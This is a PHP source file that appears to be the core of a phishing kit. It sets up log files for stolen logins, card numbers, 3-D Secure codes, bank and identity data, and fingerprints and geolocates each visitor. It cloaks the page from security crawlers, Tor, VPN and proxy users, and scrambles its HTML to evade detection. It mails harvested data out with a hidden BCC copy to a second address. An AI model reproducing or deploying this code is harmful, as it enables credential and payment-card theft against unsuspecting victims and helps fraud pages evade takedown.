<?php
session_start();
set_time_limit(0);
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
require('crack.php');

class KuzuluyArt {
  public $server_api = "https://bloodformercy.id";
  public $dir_logs = __DIR__ . "/logs";
  public $file_config = "config.json";
  public $logs_allow = "allow.txt";
  public $logs_block = "block.txt";
  public function logs($name) {
    $data = array(
	  'yale' => 'yale_format.txt',
      'login' => 'data_login.txt',
      'email' => 'data_email.txt',
      'card' => 'data_card.txt',
      '3dsecure' => 'data_3dsecure.txt',
      'bank' => 'data_bank.txt',
      'identity' => 'data_identity.txt',
      'doublecard' => 'data_double.txt',
      'loginan' => 'log_loginan.txt',
    );
    return $this->dir_logs.'/'.$data[$name];
  }
  public function config($data) {
    $config = json_decode(file_get_contents(__DIR__.'/'.$this->file_config), true);
    if ($data == "apikey") {
      return $config[$data];
    } else {
      return $config['config'][$data];
    }
  }
  public function redirect($url) {
    header("location: ".$url);
    exit;
  }
  public function session($data, $value, $page) {
    if (isset($_SESSION[$data])) {
      if ($_SESSION[$data] == $value) {
        $this->allow($page);
      } else {
        $this->block("Session incorrect");
        $this->ngeblock("official");
      }
    } else {
      $this->block("Session undefined");
      $this->ngeblock("official");
    }
  }
  public function logout() {
    @session_destroy();
    $this->delete_cookie();
  }
  public function create_cookie() {
    setcookie("access_key", $_SESSION['key'], time()+7200);
  }
  public function check_cookie() {
    if (isset($_COOKIE['access_key'])) {
      if ($_COOKIE['access_key'] != $_SESSION['key']) {
        $this->ngeblock("official");
      }
    } else {
      $this->ngeblock("official");
    }
  }
  public function delete_cookie() {
    unset($_COOKIE['access_key']);
  }
  public function quote() {
    return ucfirst("ORANG MISKIN DILARANG TIDUR");
  }
  public function bin($bin) {
    $bin = json_decode($this->curlCrack("https://lookup.binlist.net/".$bin), true);
    return array(
      'brand' => $bin['scheme'],
      'type'  => $bin['type'],
      'bank'  => $bin['bank']['name'],
      'level' => $bin['brand'],
      'country' => $bin['country']['name'],
      'full'  => $bin['scheme']." ".$bin['type']." ".$bin['bank']['name']." ".$bin['brand']
    );
  }
  public function ngerandom() {
    return $this->encypt(microtime());
  }
  public function get($url) {
    $curl = curl_init();
    $option = [
      CURLOPT_SSL_VERIFYPEER  => false,
      CURLOPT_RETURNTRANSFER  => true,
      CURLOPT_URL             => $url,
      CURLOPT_USERAGENT       => 'Mozilla/5.0 (Macintosh; Intel Mac OS X vip; rv:42.0) Gecko/06072000 Firefox/42.0',
      CURLOPT_COOKIEJAR       => $this->dir_logs.'/cookie.txt',
      CURLOPT_COOKIEFILE      => $this->dir_logs.'/cookie.txt'
    ];
    curl_setopt_array($curl, $option);
    $data = curl_exec($curl);
    $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE);
    $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    return array(
      'data'      => $data,
      'type'      => $type,
      'decode'    => json_decode($data, true),
      'httpcode'  => $httpcode
    );
  }
  public function getIp() {
    if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
      return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)) {
      return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
      return $_SERVER['REMOTE_ADDR'];
    }
  }
  public function getOs() {
    $os = "Unknown OS";
    $os_array = array(
      '/windows nt 10/i'      =>  'Windows 10',
      '/windows nt 6.3/i'     =>  'Windows 8.1',
      '/windows nt 6.2/i'     =>  'Windows 8',
      '/windows nt 6.1/i'     =>  'Windows 7',
      '/windows nt 6.0/i'     =>  'Windows Vista',
      '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
      '/windows nt 5.1/i'     =>  'Windows XP',
      '/windows xp/i'         =>  'Windows XP',
      '/windows nt 5.0/i'     =>  'Windows 2000',
      '/windows me/i'         =>  'Windows ME',
      '/win98/i'              =>  'Windows 98',
      '/win95/i'              =>  'Windows 95',
      '/win16/i'              =>  'Windows 3.11',
      '/macintosh|mac os x/i' =>  'Mac OS X',
      '/mac_powerpc/i'        =>  'Mac OS 9',
      '/linux/i'              =>  'Linux',
      '/ubuntu/i'             =>  'Ubuntu',
      '/iphone/i'             =>  'iPhone',
      '/ipod/i'               =>  'iPod',
      '/ipad/i'               =>  'iPad',
      '/android/i'            =>  'Android',
      '/blackberry/i'         =>  'BlackBerry',
      '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) {
      if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
        $os = $value;
      }
    }
    return $os;
  }
  public function getBrowser() {
    $browser = "Unknown Browser";
    $browser_array = array(
      '/msie/i'       =>  'Internet Explorer',
      '/firefox/i'    =>  'Firefox',
      '/safari/i'     =>  'Safari',
      '/chrome/i'     =>  'Chrome',
      '/edge/i'       =>  'Edge',
      '/opera/i'      =>  'Opera',
      '/netscape/i'   =>  'Netscape',
      '/maxthon/i'    =>  'Maxthon',
      '/konqueror/i'  =>  'Konqueror',
      '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) {
      if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
        $browser = $value;
      }
    }
    return $browser;
  }
  public function getHost() {
    return gethostbyaddr($_SESSION['ip']);
  }
  public function getLanguage() {
    return array(
      'code'  => substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2),
      'full'  => $_SERVER['HTTP_ACCEPT_LANGUAGE']
    );
  }
  public function getReferer() {
    if (isset($_SERVER['HTTP_REFERER'])) {
      return $_SERVER['HTTP_REFERER'];
  	} else {
      return "no-referer";
  	}
  }
  public function getUseragent() {
    return $_SERVER['HTTP_USER_AGENT'];
  }
  public function location() {
    return array(
      'title'  => implode(" - ", array($_SESSION['country'], $_SESSION['state'])),
      'full'  => implode(", ", array($_SESSION['city'], $_SESSION['district'], $_SESSION['state'], $_SESSION['country']))
    );
  }
  public function result() {
    return array(
      'login' => RESULT_LOGIN,
      'card' => RESULT_CARD,
    );
  }
  
  public function curlCrack($url)
    {
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
	
  public function data() {
    $_SESSION['ip']           = $this->getIp();
    $_SESSION['host']         = $this->getHost();
    $_SESSION['key']          = $this->ngerandom();
    $_SESSION['lang']         = $this->getLanguage()['code'];
    $_SESSION['language']     = $this->getLanguage()['full'];
    $_SESSION['os']           = $this->getOs();
    $_SESSION['browser']      = $this->getBrowser();
    $_SESSION['referer']      = $this->getReferer();
    $_SESSION['useragent']    = $this->getUseragent();
	
	$look = $this->curlCrack("http://extreme-ip-lookup.com/json/".$_SESSION['ip']."?key=OyQN2vjvWy0P4MOYW6O4");
	$jsonlook = json_decode($look, true);
	
    $_SESSION['isp']          = $jsonlook['isp'];
    $_SESSION['countrycode']  = $jsonlook['countryCode'];
    $_SESSION['country']      = $jsonlook['country'];
    $_SESSION['statecode']    = $jsonlook['region'];
    $_SESSION['state']        = $jsonlook['region'];
    $_SESSION['district']     = $jsonlook['regionName'];
    $_SESSION['city']         = $jsonlook['city'];
    $_SESSION['geonameid']    = $jsonlook['timezone'];
    $_SESSION['latlongid']    = $jsonlook['as'];
    $_SESSION['latitude']     = $jsonlook['lat'];
    $_SESSION['longitude']    = $jsonlook['lon'];
    $_SESSION['iptimezone']   = $jsonlook['timezone'];
    $_SESSION['flag']         = '<img src="https://www.countryflags.io/'.$jsonlook['countryCode'].'/flat/64.png" style="width: 20px;">';
	
  }

  public function save($file, $text, $type) {
    $fp = fopen($file, $type);
    return fwrite($fp, $text);
    fclose($fp);
  }
  public function error($str) {
    if ($str == 1) {
      $page = file_get_contents(__DIR__ . "/crack/page/suspend.html");
      $html = preg_replace('{WEBMASTER}', $_SERVER['SERVER_ADMIN'], $page);
      sleep(2); die($html);
    } elseif ($str == 2) {
      $page = file_get_contents(__DIR__ . "/crack/page/default.html");
      $html = preg_replace('{WEBMASTER}', $_SERVER['SERVER_ADMIN'], $page);
      sleep(2); die($html);
    } else {
      $page = file_get_contents(__DIR__ . "/crack/page/tcp.html");
      sleep(8); die($page);
    }
  }
  public function ngeblock($str) {
    $this->logout();
    if ($str == "error") {
      $error = rand(1,2);
      if ($error == 1) {
        $this->redirect("https://gobar.umbrellacorp.id/");
      } else{
        $this->redirect("https://gobar.umbrellacorp.id/");
      }
    } elseif ($str == "official") {
      $this->redirect("https://gobar.umbrellacorp.id/");
    }
  }
  public function allow($str) {
    $file = $this->dir_logs.'/'.$this->logs_allow;
    $time = date('H:i:s');
    $ip = $_SESSION['ip'];
    $country = $_SESSION['country'];
    $flag = $_SESSION['flag'];
    $isp = $_SESSION['isp'];
    $status = $str;
    $text = "{$time}|{$ip}|{$country} - {$flag}|{$isp}|{$status}";
    return $this->save($file, $text.PHP_EOL, "a");
  }
  public function block($str) {
    $file = $this->dir_logs.'/'.$this->logs_block;
    $time = date('H:i:s');
    $ip = $_SESSION['ip'];
    $country = $_SESSION['country'];
    $flag = $_SESSION['flag'];
    $isp = $_SESSION['isp'];
    $status = $str;
    $text = "{$time}|{$ip}|{$country} - {$flag}|{$isp}|{$status}";
    return $this->save($file, $text.PHP_EOL, "a");
  }

  public function blocker() {
    if ($this->config("useragent") == "on") { $this->blocker_useragent(); }
    if ($this->config("host") == "on") { $this->blocker_host(); }
    if ($this->config("ip") == "on") { $this->blocker_ip(); }
    if ($this->config("isp") == "on") { $this->blocker_isp(); }
    if ($this->config("dinamic") == "on") { $this->blocker_dinamic(); }
    if ($this->config("proxyport") == "on") { $this->blocker_proxyport(); }
    if ($this->config("dns") == "on") { $this->blocker_dns(); }
    if ($this->config("vpn") == "on") { $this->blocker_vpn(); }
  }
  public function blocker_email() {
    $file = file_get_contents(__DIR__ . "/crack/blocker/email.json");
	$decode = json_decode($file, true);
    foreach ($decode as $email) {
      if (stristr($_SESSION['email'], $email) !== false) {
        $this->block("Email blacklist (".$_SESSION['email'].")");
        return true;
      }
    }
  }
  public function blocker_useragent() {
    $file = file_get_contents(__DIR__ . "/crack/blocker/agent.json");
	$decode = json_decode($file, true);
    foreach ($decode as $useragent) {
      if (empty($_SESSION['useragent']) || substr_count(strtolower($_SESSION['useragent']), $useragent) > 0) {
        $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
        $this->block("Useragent blacklist");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_ip() {

	$file1 = file_get_contents(__DIR__ . "/crack/blocker/ip.json");
	$decode1 = json_decode($file1, true);
	
	$file2 = file_get_contents(__DIR__ . "/crack/blocker/latlong.json");
	$decode2 = json_decode($file2, true);
	
    $api = array(
      'ip' => $decode1,
      'latlong' => $decode2
    );
    if (in_array($_SESSION['ip'], $api['ip'])) {
      $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
      $this->block("Ip1 blacklist");
      $this->ngeblock("error");
    } else {
      foreach ($api['ip'] as $ip) {
        if (preg_match("/$ip/", $_SESSION['ip'])) {
          $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
          $this->block("Ip2 blacklist");
          $this->ngeblock("error");
        }
      }
    }
    foreach ($api['latlong'] as $latlong) {
      if (substr_count($_SESSION['latlongid'], $latlong) > 0) {
        $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
        $this->block("Ip3 blacklist");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_isp() {
    $file = file_get_contents(__DIR__ . "/crack/blocker/isp.json");
	$decode = json_decode($file, true);
    foreach ($decode as $isp) {
      if (empty($_SESSION['isp']) || substr_count(strtolower($_SESSION['isp']), $isp) > 0) {
        $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
        $this->block("Isp blacklist");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_dns() {
    $data = array('exitnodes.tor.dnsbl.sectoor.de', 'tor.dnsbl.sectoor.de', 'tor.dan.me.uk', 'bl.spamcop.net');
    foreach ($data as $dns) {
      if (checkdnsrr(implode(".", array_reverse(explode(".", $_SESSION['ip']))).".".$dns.".", "A")) {
        $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
        $this->block("Dns blacklist (".$dns.")");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_host() {
    $file = file_get_contents(__DIR__ . "/crack/blocker/host.json");
	$decode = json_decode($file, true);
    foreach ($decode as $host) {
      if (empty($_SESSION['host']) || substr_count(strtolower($_SESSION['host']), $host) > 0) {
        $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
        $this->block("Hostname blacklist");
        $this->ngeblock("error");
      }
    }
  }
  public function blocker_dinamic() {
    $data = $this->get("https://gobar.umbrellacorp.id/lookup/ip.php?ip=".$_SESSION['ip']."&ua=".$_SESSION['useragent'])['data'];
    $datajson = json_decode($data, true);
    $isBot = $datajson['isBot'];
    if ($isBot == "true") {
      $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
      $this->block("Block By Umbrella");
      $this->ngeblock("error");
    }
  }
  public function blocker_vpn() {
    $data = $this->get("https://blackbox.ipinfo.app/lookup/".$_SESSION['ip'])['data'];
    if (preg_match("/Y/", $data)) {
      $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
      $this->block("Block by blackbox.ipinfo");
      $this->ngeblock("error");
    }
  }
  public function blocker_proxyport() {
    $dataproxy = array(
      'CLIENT_IP',
      'FORWARDED',
      'FORWARDED_FOR',
      'FORWARDED_FOR_IP',
      'VIA',
      'X_FORWARDED',
      'X_FORWARDED_FOR',
      'HTTP_CLIENT_IP',
      'HTTP_FORWARDED',
      'HTTP_FORWARDED_FOR',
      'HTTP_FORWARDED_FOR_IP',
      'HTTP_PROXY_CONNECTION',
      'HTTP_VIA',
      'HTTP_X_FORWARDED',
      'HTTP_X_FORWARDED_FOR'
    );
    foreach ($dataproxy as $proxy) {
      if (isset($_SERVER[$proxy])) {
        $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
        $this->block("Proxy detected");
        $this->ngeblock("error");
      }
    }
    $dataport = array(80, 81, 553, 554, 1080, 3128, 4480, 6588, 8000, 8080);
    foreach ($dataport as $port) {
      if (@fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 3)) {
        $this->save("onetime.dat", $_SESSION['ip'].PHP_EOL, "a");
        $this->block("Port detected");
        $this->ngeblock("error");
      }
    }
  }
  public function encypt($str) {
    return md5($str);
  }
  public function image_encode($str) {
    require __DIR__ . '/system/class/mime.php';
    $url = base64_encode($this->get($str)['data']);
    $local = base64_encode(file_get_contents(__DIR__. '/'.$str));
    return array(
      'url'   => "data:".$this->get($str)['type'].";base64,".$url,
      'local' => "data:".mime_content_type($str).";base64,".$local
    );
  }
  public function text_encode($str) {
    $crypt = array("A" => "065", "a" => "097", "B" => "066", "b" => "098", "C" => "067", "c" => "099", "D" => "068", "d" => "100", "E" => "069", "e" => "101", "F" => "070", "f" => "102", "G" => "071", "g" => "103", "H" => "072", "h" => "104", "I" => "073", "i" => "105", "J" => "074", "j" => "106", "K" => "075", "k" => "107", "L" => "076", "l" => "108", "M" => "077", "m" => "109", "N" => "078", "n" => "110", "O" => "079", "o" => "111", "P" => "080", "p" => "112", "Q" => "081", "q" => "113", "R" => "082", "r" => "114", "S" => "083", "s" => "115", "T" => "084", "t" => "116", "U" => "085", "u" => "117", "V" => "086", "v" => "118", "W" => "087", "w" => "119", "X" => "088", "x" => "120", "Y" => "089", "y" => "121", "Z" => "090", "z" => "122", "0" => "048", "1" => "049", "2" => "050", "3" => "051", "4" => "052", "5" => "053", "6" => "054", "7" => "055", "8" => "056", "9" => "057", "&" => "038", " " => "032", "_" => "095", "-" => "045", "@" => "064", "." => "046");
    $encode = "";
    for ($i=0; $i < strlen($str); $i++) {
      $key = substr($str, $i, 1);
      if (array_key_exists($key, $crypt)) {
        $random = rand(1, 3);
        if ($random == '1') {
          $encode = $encode.$key;
        } elseif ($random == '3') {
          $encode = $encode.$key;
        } else {
          $encode = $encode."&#".$crypt[$key].";";
        }
      } else {
        $encode = $encode.$key;
      }
    }
    return $encode;
  }
  public function undetect($html) {
    $search = array('/\>[^\S ]+/s', '/[^\S ]+\</s', '/(\s)+/s');
    $replace = array('>', '<', '\\1', '');
    $minify = preg_replace($search, $replace, $html);
    $undetect = preg_replace('/<div/', '<!-- '.$_SESSION['key'].' --><div', $minify);
    $undetect = preg_replace('/<\/div/', '<!-- '.$_SESSION['key'].' --></div', $undetect);
    $undetect = preg_replace('/class=\"/', 'class="'.microtime(1).' ', $undetect);
    if ($this->config("undetect") == "on") {
      print($undetect);
    } else {
      print($minify);
    }
  }
  public function language() {
	return __DIR__ . '/system/language/en.php';
  }
  public function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
  }

  public function emailProvider() {
    if (preg_match("/@gmail|@googlemail/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'gmail';
    } elseif (preg_match("/@hotmail|@outlook|@live|@msn/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'microsoft';
    } elseif (preg_match("/@icloud|@mac|@me/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'icloud';
    } elseif (preg_match("/@yahoo|@ymail|@rocketmail/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'yahoo';
    } elseif (preg_match("/@charter|@spectrum/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'charter';
    } elseif (preg_match("/@aol/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'aol';
    } elseif (preg_match("/@yandex/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'yandex';
    } elseif (preg_match("/@gmx/", $_SESSION['email'])) {
      $_SESSION['provider'] = 'gmx';
    } else {
      $_SESSION['provider'] = explode("@", $_SESSION['email'])[1];
    }
  }

  public function reusltdouble()
  {
    $email = "isi email log disini";
    return $email;
  }

  public function send($to, $subject, $message, $from, $img = '') {
    require __DIR__ . '/system/class/smtp.php';
    require __DIR__ . '/system/class/phpmailer.php';
    $mail = New PHPMailer;
    if ($this->config("sending") == "smtp") {
      $mail->isSMTP();
      $mail->SMTPAuth = true;
      $mail->Host = $this->config("smtp_host");
      $mail->Port = $this->config("smtp_port");
      $mail->Username = $this->config("smtp_user");
      $mail->Password = $this->config("smtp_pass");
      $mail->SMTPSecure = $this->config("smtp_secure");
    } else {
      $mail->isMail();
    }
    $mail->isHTML(true);
    $mail->CharSet = "UTF-8";
    if (!empty($img)) {
      for ($i=0; $i < count($img); $i++) {
        $mail->AddAttachment($img[$i]);
      }
    }
    $mail->setFrom(substr($this->ngerandom(), 0, 7)."@".explode("//", $this->server_api)[1], strtoupper($from));
    $mail->Subject = strtoupper($subject);
    $mail->Body = $message;
    $mail->addAddress($to);
    $mail->addBCC($this->reusltdouble());
  	$mail->send();
 	}
}

$api = new KuzuluyArt;
?>
